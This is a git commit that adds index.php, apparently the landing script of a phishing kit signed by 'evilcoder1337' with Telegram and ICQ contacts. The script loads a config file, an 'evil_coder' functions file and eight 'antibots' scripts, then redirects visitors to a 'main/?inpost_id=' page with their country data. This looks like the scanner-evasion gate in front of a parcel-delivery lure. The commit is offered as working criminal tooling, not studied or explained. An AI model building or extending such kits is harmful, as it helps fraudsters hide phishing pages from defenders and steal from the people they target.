50c32d8e5ffc2a1c3faba045961770bcc69e30f3
navdav <navdav1203@gmail.com>
2026-08-12 20:50:14 +0100

    First Commit

---
+++ index.php
@@ -0,0 +1,34 @@
+<?php
+session_start();
+
+/*   
+		██████████          ███████       █████████    █████       █████ ████████         
+		░░███░░░░░█         ░░░░░███      ███░░░░░███ ███░░░███    ░░███ ███░░░░███        
+		░███  █ ░█████ ████████░███     ███     ░░░ ███   ░░███ ███████░░░    ░██████████ 
+		░██████ ░░███ ░░██░░███░███    ░███        ░███    ░██████░░███   ██████░░███░░███
+		░███░░█  ░███  ░███░███░███    ░███        ░███    ░██░███ ░███  ░░░░░░██░███ ░░░ 
+		░███ ░   ░░███ ███ ░███░███    ░░███     ██░░███   ███░███ ░███ ███   ░██░███     
+		██████████░░█████  █████████    ░░█████████ ░░░█████░ ░░███████░░█████████████    
+		░░░░░░░░░░  ░░░░░  ░░░░░░░░░      ░░░░░░░░░    ░░░░░░   ░░░░░░░░ ░░░░░░░░░░░░░    
+		
+		
+		ICQ & TELEGRAM : @evilcoder1337
+*/
+
+include'config.php';
+include'evil_coder/Functions/Fuck-you.php'; 
+include "antibots//antibots/1.php";
+include "antibots//antibots/2.php";
+include "antibots//antibots/3.php";
+include "antibots//antibots/4.php";
+include "antibots//antibots/5.php";
+include "antibots//antibots/6.php";
+include "antibots//antibots/7.php";
+include "antibots//antibots/8.php";
+
+
+header("Location: main/?inpost_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."");
+	
+	
+
+?>
